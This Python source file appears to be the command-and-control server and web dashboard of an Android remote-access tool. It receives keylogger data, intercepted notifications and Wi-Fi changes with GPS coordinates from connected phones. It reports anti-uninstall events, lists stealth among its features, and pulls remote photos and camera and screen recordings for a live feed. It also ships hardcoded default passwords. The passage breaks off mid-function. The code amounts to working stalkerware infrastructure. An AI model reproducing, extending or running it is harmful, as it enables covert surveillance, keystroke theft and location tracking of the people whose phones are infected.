#!/usr/bin/env python3
"""
TermuxRemote — Web Control Panel · v3.10.1
════════════════════════════════════════════════════════════════════════
Compatible with Android build v3.10.0+ (with projection-lost callback).

New in v3.10.1:
  ✦ /api/projection/state     cached per-client screen capture status
  ✦ /api/projection/request   explicit re-request (used by banner button)
  ✦ projection_state SSE      browser updates instantly when screen lost
  ✦ Persistent banner         visible on all tabs when screen missing
  ✦ Per-client tracking       each client has its own projection state
  ✦ Auto-recovery server-side rate-limit + retry

All prior features kept:
  • hash, chunked upload, mounts, mount, du_tree, reboot, install
  • screen off/on, screenrec_av, usage_stats, wifi history
  • stealth, session recording, overview, notes/tags, bulk files
  • WebSocket-ready structure, live MJPEG, PIL downscale
  • Interactive config + .termuxremote.env persistence
"""
import asyncio, base64, json, os, sys, time, re, shlex, subprocess, hashlib, secrets
import struct, fnmatch, argparse
from urllib.parse import unquote, urlparse, parse_qs

# ══════════════════════════════════════════════════════════════════════
#   CONFIG — mirrors Config.kt on the Android side
# ══════════════════════════════════════════════════════════════════════
_DEFAULT_ANDROID_HOST = "JHON1234-46137.portmap.host"
_DEFAULT_ANDROID_PORT = 46137
_DEFAULT_AUTH_TOKEN   = "mysecret123"
_DEFAULT_TCP_PORT     = 8765
_DEFAULT_HTTP_PORT    = 8080
_DEFAULT_WEB_PASSWORD = "admin123"
_DEFAULT_SAVE_DIR     = os.getcwd()
_DEFAULT_MAX_FILE     = 20 * 1024 * 1024
_DEFAULT_SERVER_LIMIT = 40 * 1024 * 1024
_DEFAULT_SESSION_TTL  = 7 * 24 * 3600

ANDROID_HOST  = _DEFAULT_ANDROID_HOST
ANDROID_PORT  = _DEFAULT_ANDROID_PORT
SECRET        = _DEFAULT_AUTH_TOKEN
TCP_PORT      = _DEFAULT_TCP_PORT
HTTP_PORT     = _DEFAULT_HTTP_PORT
MAX_FILE      = _DEFAULT_MAX_FILE
SERVER_LIMIT  = _DEFAULT_SERVER_LIMIT
SAVE_DIR      = _DEFAULT_SAVE_DIR
DEFAULT_WEB_PASSWORD = _DEFAULT_WEB_PASSWORD
WEB_SESSION_TTL = _DEFAULT_SESSION_TTL


def _script_dir():
    try:
        return os.path.dirname(os.path.abspath(__file__))
    except Exception:
        return os.getcwd()


ENV_PATH = os.path.join(_script_dir(), ".termuxremote.env")
CONFIG_PATH = os.path.join(_script_dir(), ".termuxremote_config.json")
CLIENTS_META_PATH = os.path.join(_script_dir(), "clients_meta.json")


def _load_env_file():
    if not os.path.isfile(ENV_PATH): return
    try:
        with open(ENV_PATH, "r", encoding="utf-8") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#") or "=" not in line: continue
                k, _, v = line.partition("=")
                k = k.strip(); v = v.strip().strip('"').strip("'")
                if k: os.environ.setdefault(k, v)
    except Exception:
        pass


def _save_env_file(values):
    try:
        with open(ENV_PATH, "w", encoding="utf-8") as f:
            f.write("# TermuxRemote — generated config (edit or delete to reset)\n")
            for k, v in values.items():
                f.write(f"{k}={v}\n")
    except Exception as e:
        print(f"[!] could not write {ENV_PATH}: {e}")


def _env_int(name, default):
    try: return int(os.environ.get(name, str(default)))
    except Exception: return default


def _parse_args():
    p = argparse.ArgumentParser(prog="app1.py",
        description="TermuxRemote Web Control Panel", add_help=True)
    p.add_argument("--host"); p.add_argument("--port", type=int)
    p.add_argument("--token"); p.add_argument("--tcp-port", type=int)
    p.add_argument("--http-port", type=int); p.add_argument("--web-pw")
    p.add_argument("--save-dir")
    p.add_argument("--no-prompt", action="store_true")
    p.add_argument("--reset", action="store_true")
    return p.parse_args()


def _prompt(label, current, secret=False):
    try:
        shown = current
        if secret and current and len(current) > 6:
            shown = current[:3] + "…" + current[-2:]
        q = f"  {label} [{shown}]: "
        val = input(q).strip()
        return val if val else current
    except (EOFError, KeyboardInterrupt):
        print(); return current


def _resolve_config(args):
    global ANDROID_HOST, ANDROID_PORT, SECRET, TCP_PORT, HTTP_PORT
    global MAX_FILE, SERVER_LIMIT, SAVE_DIR, DEFAULT_WEB_PASSWORD, WEB_SESSION_TTL

    if args.reset and os.path.isfile(ENV_PATH):
        try: os.remove(ENV_PATH); print(f"[i] removed {ENV_PATH}")
        except Exception as e: print(f"[!] could not remove {ENV_PATH}: {e}")

    _load_env_file()

    host  = os.environ.get("TERMUX_HOST",  _DEFAULT_ANDROID_HOST)
    port  = _env_int("TERMUX_PORT",        _DEFAULT_ANDROID_PORT)
    token = os.environ.get("TERMUX_TOKEN", _DEFAULT_AUTH_TOKEN)
    tcp   = _env_int("TERMUX_TCP_PORT",    _DEFAULT_TCP_PORT)
    http  = _env_int("TERMUX_HTTP_PORT",   _DEFAULT_HTTP_PORT)
    webpw = os.environ.get("TERMUX_WEB_PW", _DEFAULT_WEB_PASSWORD)
    sdir  = os.environ.get("TERMUX_SAVE_DIR", _DEFAULT_SAVE_DIR)

    if args.host:      host  = args.host
    if args.port:      port  = args.port
    if args.token:     token = args.token
    if args.tcp_port:  tcp   = args.tcp_port
    if args.http_port: http  = args.http_port
    if args.web_pw:    webpw = args.web_pw
    if args.save_dir:  sdir  = args.save_dir

    want_prompt = (not args.no_prompt) and sys.stdin.isatty()
    first_run   = not os.path.isfile(ENV_PATH)

    if want_prompt:
        print("\n  ── First run — quick setup ──" if first_run
              else f"\n  ── Config loaded from {os.path.basename(ENV_PATH)} ──")
        print("  (press Enter to keep the value in [brackets])\n")
        host = _prompt("Public host (Android connects here)", host)
        try:
            v = input(f"  Public port                            [{port}]: ").strip()
            if v: port = int(v)
        except (EOFError, KeyboardInterrupt, ValueError): pass
        token = _prompt("Auth token (must match Config.kt)", token, secret=True)
        try:
            v = input(f"  Local TCP listen port                  [{tcp}]: ").strip()
            if v: tcp = int(v)
        except (EOFError, KeyboardInterrupt, ValueError): pass
        try:
            v = input(f"  Web dashboard port                     [{http}]: ").strip()
            if v: http = int(v)
        except (EOFError, KeyboardInterrupt, ValueError): pass
        if first_run:
            webpw = _prompt("Web login password (first run)", webpw, secret=True)
        _save_env_file({
            "TERMUX_HOST": host, "TERMUX_PORT": port, "TERMUX_TOKEN": token,
            "TERMUX_TCP_PORT": tcp, "TERMUX_HTTP_PORT": http,
            "TERMUX_WEB_PW": webpw, "TERMUX_SAVE_DIR": sdir,
        })
        print(f"\n  [i] saved → {ENV_PATH}\n")

    ANDROID_HOST = host; ANDROID_PORT = port
    SECRET = token; TCP_PORT = tcp; HTTP_PORT = http
    DEFAULT_WEB_PASSWORD = webpw; SAVE_DIR = sdir
    MAX_FILE = _env_int("TERMUX_MAX_FILE", _DEFAULT_MAX_FILE)
    SERVER_LIMIT = _env_int("TERMUX_SERVER_LIMIT", _DEFAULT_SERVER_LIMIT)
    WEB_SESSION_TTL = _env_int("TERMUX_SESSION_TTL", _DEFAULT_SESSION_TTL)

    os.environ["TERMUX_HOST"] = host
    os.environ["TERMUX_PORT"] = str(port)
    os.environ["TERMUX_TOKEN"] = token


def _hash_pw(pw, salt=None):
    salt = salt or secrets.token_hex(16)
    h = hashlib.sha256((salt + pw).encode("utf-8")).hexdigest()
    return salt, h


def _verify_pw(pw, salt, expected):
    _, h = _hash_pw(pw, salt)
    return secrets.compare_digest(h, expected)


def load_config():
    cfg = {}
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f: cfg = json.load(f)
        except Exception: cfg = {}
    if "pw_salt" not in cfg or "pw_hash" not in cfg:
        salt, h = _hash_pw(DEFAULT_WEB_PASSWORD)
        cfg["pw_salt"] = salt; cfg["pw_hash"] = h
        try:
            with open(CONFIG_PATH, "w") as f: json.dump(cfg, f)
        except Exception: pass
    return cfg


def save_config(cfg):
    try:
        with open(CONFIG_PATH, "w") as f: json.dump(cfg, f)
    except Exception as e:
        print(f"[!] config save failed: {e}")


def _load_clients_meta():
    try:
        if os.path.isfile(CLIENTS_META_PATH):
            with open(CLIENTS_META_PATH, "r", encoding="utf-8") as f:
                return json.load(f) or {}
    except Exception as e:
        print(f"[!] clients_meta load failed: {e}")
    return {}


def _save_clients_meta():
    try:
        with open(CLIENTS_META_PATH, "w", encoding="utf-8") as f:
            json.dump(clients_meta, f, indent=2)
    except Exception as e:
        print(f"[!] clients_meta save failed: {e}")


_ARGS = _parse_args()
_resolve_config(_ARGS)

CONFIG = load_config()
clients_meta = _load_clients_meta()

ENDPOINT_PUBLIC = f"{ANDROID_HOST}:{ANDROID_PORT}"
ENDPOINT_LOCAL  = f"0.0.0.0:{TCP_PORT}"


def new_session():
    tok = secrets.token_urlsafe(32)
    _sessions[tok] = time.time() + WEB_SESSION_TTL
    return tok


def check_session(tok):
    if not tok: return False
    exp = _sessions.get(tok)
    if not exp: return False
    if exp < time.time():
        _sessions.pop(tok, None); return False
    return True


def revoke_session(tok): _sessions.pop(tok, None)


def get_cookie(headers, name):
    c = headers.get("cookie", "")
    for part in c.split(";"):
        k, _, v = part.strip().partition("=")
        if k == name: return v
    return None


# ══════════════════════════════════════════════════════════════════════
#   RUNTIME STATE
# ══════════════════════════════════════════════════════════════════════
_sessions = {}
clients = {}
active = None
pending = None
send_lock = asyncio.Lock()
remote_cwd = ""
sse_subscribers = set()
live_clips = {}
live_clip_seq = {}
keylog_buffer = []
KEYLOG_KEEP = 500
notif_buffer = []
NOTIF_KEEP = 300
client_net = {}
app_cache = {}

# ★ Per-client projection state
projection_state = {}   # client_id -> {"screen": bool, "msg": str, "ts": float, "reason": str, "denied": bool}

# Session recording
session_recording = False
session_events = []
SESSION_MAX = 5000
reconnect_counts = {}

# WiFi + usage caches
wifi_history_cache = {}
usage_cache = {}

# Chunked uploads
chunk_uploads = {}   # upload_id -> {...}


async def record_session_event(evtype, client_id, data):
    if not session_recording: return
    try:
        entry = {"ts": time.time(), "type": evtype,
                 "client": client_id or "?", "data": data or {}}
        session_events.append(entry)
        if len(session_events) > SESSION_MAX:
            del session_events[:-SESSION_MAX]
        await sse_broadcast("session_event", entry)
    except Exception:
        pass


try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    _CRYPTO_OK = True
except Exception:
    _CRYPTO_OK = False
    print("[!] 'cryptography' package not installed. Run: pip install cryptography")

try:
    from PIL import Image
    import io as _pil_io
    _PIL_OK = True
except Exception:
    _PIL_OK = False
    print("[i] PIL not installed — screen live will stream at full resolution")

ENC_MAGIC = b"TREM"
ENC_VERSION = 1
ENC_SALT_LEN = 16
ENC_NONCE_LEN = 12
ENC_ITER = 200_000
ENC_MASTER = os.environ.get("TERMUX_ENC_KEY", "") or (SECRET + "::enc::v1")
AUTO_ENCRYPT_MEDIA = os.environ.get("TERMUX_AUTO_ENC", "0") == "1"


def _derive_key(password, salt, length=32):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=length,
                     salt=salt, iterations=ENC_ITER)
    return kdf.derive(password.encode("utf-8"))


def encrypt_bytes(plaintext, password=None):
    if not _CRYPTO_OK: raise RuntimeError("cryptography package missing")
    pw = password or ENC_MASTER
    salt = os.urandom(ENC_SALT_LEN)
    nonce = os.urandom(ENC_NONCE_LEN)
    key = _derive_key(pw, salt, 32)
    ct = AESGCM(key).encrypt(nonce, plaintext, None)
    return ENC_MAGIC + bytes([ENC_VERSION]) + salt + nonce + ct


def decrypt_bytes(blob, password=None):
    if not _CRYPTO_OK: raise RuntimeError("cryptography package missing")
    if len(blob) < 4 + 1 + ENC_SALT_LEN + ENC_NONCE_LEN + 16:
        raise ValueError("ciphertext too short")
    if blob[:4] != ENC_MAGIC: raise ValueError("bad magic")
    if blob[4] != ENC_VERSION: raise ValueError(f"unsupported version {blob[4]}")
    off = 5
    salt = blob[off:off + ENC_SALT_LEN]; off += ENC_SALT_LEN
    nonce = blob[off:off + ENC_NONCE_LEN]; off += ENC_NONCE_LEN
    ct = blob[off:]
    pw = password or ENC_MASTER
    key = _derive_key(pw, salt, 32)
    return AESGCM(key).decrypt(nonce, ct, None)


def is_encrypted(blob):
    return len(blob) >= 5 and blob[:4] == ENC_MAGIC and blob[4] == ENC_VERSION


def encrypt_file_inplace(path, password=None):
    with open(path, "rb") as f: data = f.read()
    blob = encrypt_bytes(data, password)
    out = path + ".enc"
    with open(out, "wb") as f: f.write(blob)
    try: os.remove(path)
    except Exception: pass
    return out


def decrypt_file_inplace(path, password=None):
    with open(path, "rb") as f: blob = f.read()
    data = decrypt_bytes(blob, password)
    out = path[:-4] if path.endswith(".enc") else path + ".dec"
    with open(out, "wb") as f: f.write(data)
    try: os.remove(path)
    except Exception: pass
    return out


class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    BLUE="\033[94m"; MAGENTA="\033[95m"; CYAN="\033[96m"
    WHITE="\033[97m"; GRAY="\033[90m"


_ABORT_EXCS = (ConnectionAbortedError, ConnectionResetError,
               BrokenPipeError, ConnectionError,
               asyncio.IncompleteReadError, OSError)


def _is_abort(exc): return isinstance(exc, _ABORT_EXCS)


async def sse_broadcast(event, payload):
    if not sse_subscribers: return
    try:
        msg = f"event: {event}\ndata: {json.dumps(payload)}\n\n"
    except Exception: return
    dead = []
    for q in list(sse_subscribers):
        try: q.put_nowait(msg)
        except asyncio.QueueFull: dead.append(q)
    for q in dead: sse_subscribers.discard(q)


def clients_snapshot():
    now = time.time()
    out = []
    for cid, i in clients.items():
        meta = clients_meta.get(cid, {})
        proj = projection_state.get(cid, {})
        snap = {
            "id": cid, "model": i.get("model", "?"),
            "android": i.get("android", "?"),
            "build": i.get("build", "?"),
            "secs": int(now - i["connected"]),
            "active": cid == active,
            "last_hb": i.get("last_hb", 0),
            "notes": meta.get("notes", ""),
            "tags": meta.get("tags", []),
            "display_name": meta.get("display_name", ""),
            "reconnect_count": reconnect_counts.get(cid, 0),
            "screen": proj.get("screen"),
        }
        net = client_net.get(cid)
        if net:
            snap["ip"] = net.get("ip", "")
            snap["port"] = net.get("port", "")
        out.append(snap)
    return out


def _record_projection_state(cid, data):
    """Update projection_state[cid] from a perm_state event payload."""
    if not cid: return
    prev = projection_state.get(cid, {})
    if "screen" in data:
        prev["screen"] = data.get("screen")
    if data.get("msg"): prev["msg"] = data.get("msg")
    if data.get("reason"): prev["reason"] = data.get("reason")
    if data.get("denied"): prev["denied"] = True
    else: prev["denied"] = data.get("denied", prev.get("denied", False))
    prev["ts"] = time.time()
    projection_state[cid] = prev


# ══════════════════════════════════════════════════════════════════════
#   TCP HANDLER
# ══════════════════════════════════════════════════════════════════════
async def handle_tcp(reader, writer):
    global active, pending, remote_cwd
    peer = writer.get_extra_info('peername')
    print(f"{C.GRAY} ⟡ tcp connect {peer}{C.RESET}")
    authed = False
    client_id = None
    try:
        while True:
            try:
                raw = await reader.readline()
            except _ABORT_EXCS as e:
                print(f"{C.GRAY} ⟡ tcp abort {peer}: {type(e).__name__}{C.RESET}")
                break
            except asyncio.CancelledError: raise
            except Exception as e:
                print(f"{C.GRAY} ⟡ tcp read err {peer}: {type(e).__name__}: {e}{C.RESET}")
                break

            if not raw: break

            try: data = json.loads(raw.decode().strip())
            except Exception: continue

            if not authed:
                if data.get("auth") == SECRET:
                    client_id = data.get("id") or f"{peer[0]}:{peer[1]}"
                    model = data.get("model", "?")
                    android = data.get("android", "?")
                    build = data.get("build", "?")
                    if client_id in clients:
                        old = clients[client_id]
                        await sse_broadcast("reconnect", {"id": client_id})
                        try: old['writer'].close()
                        except Exception: pass
                    clients[client_id] = {
                        'writer': writer, 'peer': peer,
                        'model': model, 'android': android, 'build': build,
                        'connected': time.time(),
                        'last_hb': time.time(),
                    }
                    if active is None:
                        active = client_id; remote_cwd = ""
                    authed = True
                    app_cache.pop(client_id, None)
                    # Reset projection state on fresh connect
                    projection_state[client_id] = {
                        "screen": None, "msg": "", "ts": time.time(),
                        "reason": "", "denied": False,
                    }
                    print(f"{C.GREEN} ✓ {client_id} connected [{model}/{android}]{C.RESET}")
                    reconnect_counts[client_id] = reconnect_counts.get(client_id, 0) + 1
                    await record_session_event("client_connect", client_id,
                        {"model": model, "android": android, "build": build,
                         "reconnect_n": reconnect_counts[client_id]})
                    await sse_broadcast("connect",
                        {"id": client_id, "model": model, "android": android})
                    await sse_broadcast("clients",
                        {"clients": clients_snapshot(), "active": active})
                else:
                    print(f"{C.RED} ✗ auth failed from {peer}{C.RESET}")
                    await sse_broadcast("connect-fail", {"peer": str(peer)})
                    try: writer.close()
                    except Exception: pass
                    return
                continue

            if data.get("event"):
                ev = data["event"]
                if ev != "heartbeat":
                    _sdata = {k: v for k, v in data.items() if k != "event"}
                    await record_session_event(ev, client_id, _sdata)

                if ev == "heartbeat":
                    if client_id in clients:
                        clients[client_id]["last_hb"] = time.time()
                    continue

                if ev == "keylog":
                    try:
                        entry = json.loads(data.get("data", "{}"))
                        entry["client"] = client_id
                        keylog_buffer.append(entry)
                        if len(keylog_buffer) > KEYLOG_KEEP:
                            del keylog_buffer[:-KEYLOG_KEEP]
                        await sse_broadcast("keylog", entry)
                    except Exception: pass
                    continue

                if ev == "keylogger":
                    await sse_broadcast("push", {
                        "event": "keylogger",
                        "status": data.get("status", ""),
                        "msg": data.get("msg", ""),
                        "client": client_id})
                    continue

                if ev == "notification":
                    try:
                        entry = json.loads(data.get("data", "{}"))
                        entry["client"] = client_id
                        notif_buffer.append(entry)
                        if len(notif_buffer) > NOTIF_KEEP:
                            del notif_buffer[:-NOTIF_KEEP]
                        await sse_broadcast("notification", entry)
                    except Exception: pass
                    continue

                if ev == "notification_removed":
                    try:
                        rem = json.loads(data.get("data", "{}"))
                        rem["client"] = client_id
                        await sse_broadcast("notification_removed", rem)
                    except Exception: pass
                    continue

                if ev == "notif_svc":
                    await sse_broadcast("push", {
                        "event": "notif_svc",
                        "status": data.get("status", ""),
                        "msg": data.get("msg", ""),
                        "client": client_id})
                    continue

                if ev == "notif_state":
                    await sse_broadcast("push", {
                        "event": "notif_state",
                        "forwarding": data.get("forwarding", True),
                        "msg": data.get("msg", ""),
                        "client": client_id})
                    continue

                if ev == "net_update":
                    ip_now = data.get("ip", ""); port_now = data.get("port", "")
                    if client_id:
                        client_net[client_id] = {"ip": ip_now, "port": port_now,
                                                 "connected": True, "clientId": client_id}
                    await sse_broadcast("push", {
                        "event": "net_update", "ip": ip_now, "port": port_now,
                        "token_changed": data.get("token_changed", False),
                        "msg": data.get("msg", ""), "client": client_id})
                    await sse_broadcast("clients",
                        {"clients": clients_snapshot(), "active": active})
                    continue

                if ev == "perm_req":
                    await sse_broadcast("push", {
                        "event": "perm_req",
                        "what": data.get("what", ""), "client": client_id})
                    continue

                # ★★ PROJECTION STATE TRACKING
                if ev == "perm_state":
                    _record_projection_state(client_id, data)
                    await sse_broadcast("push", {
                        "event": "perm_state",
                        "screen": data.get("screen", None),
                        "overlay": data.get("overlay", None),
                        "msg": data.get("msg", ""),
                        "missing": data.get("missing", ""),
                        "reason": data.get("reason", ""),
                        "denied": data.get("denied", False),
                        "client": client_id})
                    # Broadcast updated projection state to all SSE subscribers
                    st = projection_state.get(client_id, {})
                    await sse_broadcast("projection_state", {
                        "client": client_id,
                        "screen": st.get("screen"),
                        "msg": st.get("msg", ""),
                        "reason": st.get("reason", ""),
                        "denied": st.get("denied", False),
                        "ts": st.get("ts", 0)})
                    await sse_broadcast("clients",
                        {"clients": clients_snapshot(), "active": active})
                    continue

                if ev == "app_launched":
                    await sse_broadcast("push", {
                        "event": "app_launched",
                        "pkg": data.get("pkg", ""), "how": data.get("how", ""),
                        "client": client_id})
                    continue

                if ev == "anti_uninstall":
                    await sse_broadcast("push", {
                        "event": "anti_uninstall",
                        "action": data.get("action", ""),
                        "pkg": data.get("pkg", ""),
                        "text": data.get("text", ""), "client": client_id})
                    continue

                if ev == "wifi_change":
                    try:
                        entry = {
                            "client": client_id,
                            "ssid": data.get("ssid", "?"),
                            "prev": data.get("prev", ""),
                            "lat": data.get("lat"), "lon": data.get("lon"),
                            "acc": data.get("acc"), "ts": time.time()}
                        wifi_history_cache.setdefault(client_id, []).append(entry)
                        if len(wifi_history_cache[client_id]) > 500:
                            del wifi_history_cache[client_id][:-500]
                        await sse_broadcast("wifi_change", entry)
                        await sse_broadcast("push", {
                            "event": "wifi_change",
                            "ssid": entry["ssid"], "prev": entry["prev"],
                            "lat": entry["lat"], "lon": entry["lon"],
                            "acc": entry["acc"], "client": client_id})
                    except Exception: pass
                    continue

                if ev == "screen_state":
                    await sse_broadcast("push", {
                        "event": "screen_state",
                        "state": data.get("state", ""), "client": client_id})
                    continue

                payload = {"event": ev, "client": client_id}
                for k, v in data.items():
                    if k != "event": payload[k] = v
                await sse_broadcast("push", payload)
                continue

            if pending and not pending.done():
                pending.set_result(data)

    except asyncio.CancelledError: raise
    except _ABORT_EXCS as e:
        print(f"{C.GRAY} ⟡ tcp loop abort {peer}: {type(e).__name__}{C.RESET}")
    except Exception as e:
        print(f"{C.RED} tcp loop unexpected {peer}: {type(e).__name__}: {e}{C.RESET}")
    finally:
        if client_id and client_id in clients:
            del clients[client_id]
            client_net.pop(client_id, None)
            app_cache.pop(client_id, None)
            if active == client_id:
                active = next(iter(clients)) if clients else None
                remote_cwd = ""
        try: writer.close()
        except Exception: pass
        if client_id:
            print(f"{C.RED} ✗ {client_id} disconnected (remaining {len(clients)}){C.RESET}")
            # Clear projection state on disconnect
            projection_state.pop(client_id, None)
            try:
                await record_session_event("client_disconnect", client_id,
                    {"remaining": len(clients)})
            except Exception: pass
            try:
                await sse_broadcast("disconnect",
                    {"id": client_id, "remaining": len(clients)})
                await sse_broadcast("clients",
                    {"clients": clients_snapshot(), "active": active})
            except Exception: pass


async def send(cmd, args=None, to=None, timeout=400):
    global pending, remote_cwd
    async with send_lock:
        target = to or active
        if not target or target not in clients:
            return {"error": "no client selected"}
        loop = asyncio.get_running_loop()
        pending = loop.create_future()
        payload = {"cmd": cmd, "args": args or []}
        msg = (json.dumps(payload) + "\n").encode()
        try:
            clients[target]['writer'].write(msg)
            await clients[target]['writer'].drain()
        except _ABORT_EXCS as e:
            return {"error": f"client gone: {type(e).__name__}"}
        except Exception as e:
            return {"error": f"write failed: {e}"}
        try:
            result = await asyncio.wait_for(pending, timeout)
            if cmd in ("cd", "pwd", "cwd") and isinstance(result, dict):
                out = result.get("output", "")
                if cmd == "cd" and "cwd →" in out:
                    remote_cwd = out.split("cwd →", 1)[1].strip()
                    result["cwd"] = remote_cwd
                elif cmd in ("pwd", "cwd") and out:
                    remote_cwd = out.strip(); result["cwd"] = remote_cwd
            if "cwd" in result:
                await sse_broadcast("cwd", {"cwd": result["cwd"]})
            return result
        except asyncio.TimeoutError:
            return {"error": "timeout"}


def unique_path(dirpath, name):
    base, ext = os.path.splitext(name)
    final = os.path.join(dirpath, name); i = 1
    while os.path.exists(final):
        final = os.path.join(dirpath, f"{base}_{i}{ext}"); i += 1
    return final


def auto_save_media(r):
    if "file" not in r or not r["file"]: return None
    try: data = base64.b64decode(r["file"])
    except Exception as e:
        print(f"{C.RED}[!] b64 decode failed: {e}{C.RESET}"); return None
    name = r.get("filename") or f"incoming_{int(time.time())}.bin"
    path = unique_path(SAVE_DIR, name)
    try:
        with open(path, "wb") as f: f.write(data)
        print(f"{C.GREEN} [auto-saved] {path} ({len(data)} bytes){C.RESET}")
        return path
    except Exception as e:
        print(f"{C.RED}[!] save failed: {e}{C.RESET}"); return None


def process_media_response(r):
    if not isinstance(r, dict): return r
    if "file" in r and r["file"]:
        saved = auto_save_media(r)
        if saved:
            r["saved_name"] = os.path.basename(saved)
            r["saved_size"] = os.path.getsize(saved)
            if AUTO_ENCRYPT_MEDIA and _CRYPTO_OK and not saved.endswith(".enc"):
                try:
                    enc_path = encrypt_file_inplace(saved)
                    r["saved_name"] = os.path.basename(enc_path)
                    r["saved_size"] = os.path.getsize(enc_path)
                    r["encrypted"] = True
                except Exception as e: r["encrypt_error"] = str(e)
        del r["file"]
    return r


LIVE_KEEP = 6


def cleanup_live_session(session):
    lst = live_clips.pop(session, [])
    for fn in lst:
        try: os.remove(os.path.join(SAVE_DIR, fn))
        except Exception: pass
    live_clip_seq.pop(session, None)


def trim_live_session(session):
    lst = live_clips.get(session, [])
    while len(lst) > LIVE_KEEP:
        old = lst.pop(0)
        try: os.remove(os.path.join(SAVE_DIR, old))
        except Exception: pass


async def _record_clip(session, cmd, args, fname_prefix, duration_ms):
    global live_clip_seq
    if session not in live_clip_seq: live_clip_seq[session] = 0
    live_clip_seq[session] += 1
    fname = f"{fname_prefix}_{session}_{live_clip_seq[session]:04d}.mp4"
    full_args = list(args) + [fname]
    r = await send(cmd, full_args)
    if "error" in r: return {"error": r["error"]}
    b64 = r.get("file", "")
    if not b64: return {"error": r.get("note") or "no data"}
    try: data = base64.b64decode(b64)
    except Exception as e: return {"error": f"decode: {e}"}
    path = os.path.join(SAVE_DIR, fname)
    try:
        with open(path, "wb") as f: f.write(data)
    except Exception as e: return {"error": f"write: {e}"}
    live_clips.setdefault(session, []).append(fname)
    trim_live_session(session)
    return {"ok": True, "name": fname, "url": f"/download/{fname}",
            "size": len(data), "duration_ms": duration_ms}


async def record_live_video(session, facing, secs):
    return await _record_clip(session, "video", [facing, str(secs)],
                              "_liveclip", int(secs * 1000))


async def record_live_screen(session, secs):
    return await _record_clip(session, "screenrec", [str(secs)],
                              "_livescr", int(secs * 1000))


STATUS_TEXT = {200: "OK", 206: "Partial Content", 400: "Bad Request",
               404: "Not Found", 405: "Method Not Allowed",
               503: "Service Unavailable", 500: "Internal Server Error"}


async def http_reply(writer, status, ctype, body, extra=None):
    if isinstance(body, str): body = body.encode("utf-8")
    lines = [
        f"HTTP/1.1 {status} {STATUS_TEXT.get(status, 'OK')}",
        f"Content-Type: {ctype}",
        f"Content-Length: {len(body)}",
        "Access-Control-Allow-Origin: *",
        "Connection: close",
    ]
    if extra:
        for k, v in extra.items(): lines.append(f"{k}: {v}")
    try:
        writer.write(("\r\n".join(lines) + "\r\n\r\n").encode("latin-1"))
        writer.write(body)
        await writer.drain()
    except _ABORT_EXCS: pass
    except Exception: pass


async def http_json(writer, obj, status=200):
    await http_reply(writer, status, "application/json", json.dumps(obj))


async def read_http(reader):
    line = await reader.readline()
    if not line: return None
    parts = line.decode("latin-1").strip().split(" ", 2)
    if len(parts) != 3: return None
    method, path, _ = parts
    headers = {}
    while True:
        h = await reader.readline()
        if not h or h in (b"\r\n", b"\n"): break
        k, _, v = h.decode("latin-1").partition(":")
        headers[k.strip().lower()] = v.strip()
    body = b""
    if "content-length" in headers:
        try:
            n = int(headers["content-length"])
            body = await reader.readexactly(n)
        except Exception: body = b""
    return method, path, headers, body


def parse_multipart(body, boundary):
    out = {}
    delim = b"--" + boundary.encode("latin-1")
    for chunk in body.split(delim)[1:]:
        if chunk.startswith(b"\r\n"): chunk = chunk[2:]
        if chunk.startswith(b"--"): break
        if chunk.endswith(b"\r\n"): chunk = chunk[:-2]
        hdr_end = chunk.find(b"\r\n\r\n")
        if hdr_end == -1: continue
        hdr = chunk[:hdr_end].decode("utf-8", errors="replace")
        content = chunk[hdr_end + 4:]
        m = re.search(r'name="([^"]+)"', hdr)
        if m: out[m.group(1)] = content
    return out


def parse_multipart_multi(body, boundary):
    fields = {}; files = []
    delim = b"--" + boundary.encode("latin-1")
    for chunk in body.split(delim)[1:]:
        if chunk.startswith(b"\r\n"): chunk = chunk[2:]
        if chunk.startswith(b"--"): break
        if chunk.endswith(b"\r\n"): chunk = chunk[:-2]
        hdr_end = chunk.find(b"\r\n\r\n")
        if hdr_end == -1: continue
        hdr = chunk[:hdr_end].decode("utf-8", errors="replace")
        content = chunk[hdr_end + 4:]
        m = re.search(r'name="([^"]+)"(?:;\s*filename="([^"]*)")?', hdr)
        if not m: continue
        fname = m.group(1); file_name = m.group(2)
        if file_name is not None:
            safe = os.path.basename(file_name) or f"upload_{len(files)}.bin"
            files.append((safe, content))
        else:
            fields[fname] = content
    return {"fields": fields, "files": files}


MIME_BY_EXT = {
    "png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg",
    "webp": "image/webp", "gif": "image/gif", "bmp": "image/bmp",
    "mp4": "video/mp4", "m4v": "video/mp4", "webm": "video/webm",
    "mkv": "video/x-matroska",
    "m4a": "audio/mp4", "aac": "audio/aac", "mp3": "audio/mpeg",
    "wav": "audio/wav", "ogg": "audio/ogg",
    "txt": "text/plain; charset=utf-8", "json": "application/json",
    "enc": "application/octet-stream", "zip": "application/zip",
    "apk": "application/vnd.android.package-archive",
}


def mime_for(name):
    ext = name.rsplit(".", 1)[-1].lower() if "." in name else ""
    return MIME_BY_EXT.get(ext, "application/octet-stream")


async def http_reply_live(writer, facing, client_id, fps=1.0):
    print(f"{C.CYAN} ● live camera START client={client_id} facing={facing}{C.RESET}")
    try:
        writer.write((
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n"
            "Cache-Control: no-cache, no-store, must-revalidate\r\n"
            "Pragma: no-cache\r\n"
            "Access-Control-Allow-Origin: *\r\n"
            "Connection: close\r\n\r\n").encode("latin-1"))
        await writer.drain()
    except Exception: return
    frame_delay = 1.0 / max(0.2, fps)
    last_err = ""; err_count = 0
    try:
        while True:
            t0 = time.time()
            if client_id not in clients: break
            try:
                r = await send("photo", [facing, "_live_preview.jpg"], to=client_id)
            except Exception as e: r = {"error": str(e)}
            if "error" in r:
                err_count += 1
                msg = r.get("error", "?")
                if msg != last_err:
                    print(f"{C.YELLOW} live err: {msg}{C.RESET}"); last_err = msg
                if err_count > 5: break
                await asyncio.sleep(1.5); continue
            err_count = 0
            b64 = r.get("file", "")
            if not b64:
                await asyncio.sleep(frame_delay); continue
